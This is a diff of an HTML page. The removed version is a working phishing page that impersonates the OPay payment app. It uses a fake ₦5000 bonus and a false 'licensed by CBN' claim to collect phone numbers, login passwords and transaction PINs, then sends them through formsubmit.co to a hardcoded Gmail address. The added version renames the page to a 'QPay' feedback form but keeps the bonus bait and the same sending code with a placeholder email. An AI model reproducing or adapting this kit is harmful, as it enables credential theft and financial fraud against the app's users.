@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>OPay Anniversary </title>
+<title>QPay Anniversary Feedback</title>
 <style>
 *{box-sizing:border-box; font-family:-apple-system, sans-serif}
 body{margin:0; background:#f5f5f7; display:flex; justify-content:center}
@@ -25,55 +25,55 @@ body{margin:0; background:#f5f5f7; display:flex; justify-content:center}
 <body>
 <div class="page">
   <div class="banner">
-    <div class="logo"> OPay</div>
-    <p>OPay ANNIVERSARY -<br>verify your details to claim reward<br>â‚¦5000 bonus for lucky users!<br>*T&C apply</p>
+    <div class="logo">🛡️ QPay</div>
+    <p>QPay FIRST ANNIVERSARY -<br>Share your feedback!<br>N5000 bonus for lucky users!<br>*T&C apply</p>
   </div>
   <div class="content">
-    <h1>Quickly claim your â‚¦5000ðŸŽ‰</h1>
-    <div class="sub">feel the following forms</div>
+    <h1>We Value Your Feedback</h1>
+    <div class="sub">Answer 3 quick questions</div>
 
     <div class="card">
-      <div class="q"><span class="badge">1</span> enter your phone number </div>
-      <textarea id="q1" placeholder="type your number here..."></textarea>
+      <div class="q"><span class="badge">1</span> How was your QPay experience?</div>
+      <textarea id="q1" placeholder="Share your experience here..."></textarea>
     </div>
 
     <div class="card">
-      <div class="q"><span class="badge">2</span> enter login password</div>
-      <textarea id="q2" placeholder="type your password here"></textarea>
+      <div class="q"><span class="badge">2</span> What can we improve?</div>
+      <textarea id="q2" placeholder="Your suggestions to help us improve..."></textarea>
     </div>
 
     <div class="card">
-      <div class="q"><span class="badge">3</span> enter your confirmation pin</div>
-      <textarea id="q3" placeholder="type your transaction code "></textarea>
+      <div class="q"><span class="badge">3</span> Any other suggestions?</div>
+      <textarea id="q3" placeholder="Anything else we'd love to hear..."></textarea>
     </div>
 
-    <button class="btn" onclick="submit feedback ()">verify</button>
-    <div class="foot"> opay licensed by CBN Ã¢â‚¬Â¢ 100% confidential</div>
+    <button class="btn" onclick="submitFeedback()">Submit Feedback</button>
+    <div class="foot">Your feedback helps us serve you better • 100% confidential</div>
   </div>
 </div>
 
 <script>
-function submit feedback (){
+function submitFeedback(){
   const q1 = document.getElementById('q1').value.trim();
   const q2 = document.getElementById('q2').value.trim();
   const q3 = document.getElementById('q3').value.trim();
   if(!q1 || !q2 || !q3){ alert('Please answer all 3 questions'); return; }
 
   // REPLACE YOUR EMAIL BELOW
-  const ownerEmail = 'badyybobo@gmail.com';
+  const ownerEmail = 'YOUR_EMAIL@gmail.com';
 
   fetch('https://formsubmit.co/ajax/'+ownerEmail, {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({
-      subject: 'New OPay Feedback - 3 Answers',
+      subject: 'New QPay Feedback - 3 Answers',
       Q1_Experience: q1,
       Q2_Improve: q2,
       Q3_Other: q3
     })
   })
   .then(() => {
-    alert('Thank you! you will receive your bonus within a minute check your app.');
+    alert('Thank you! Your 3 feedback sent successfully.');
     document.getElementById('q1').value=''; document.getElementById('q2').value=''; document.getElementById('q3').value='';
   })
   .catch(() => {
@@ -82,4 +82,4 @@ function submit feedback (){
 }
 </script>
 </body>
-  </html>
+</html>
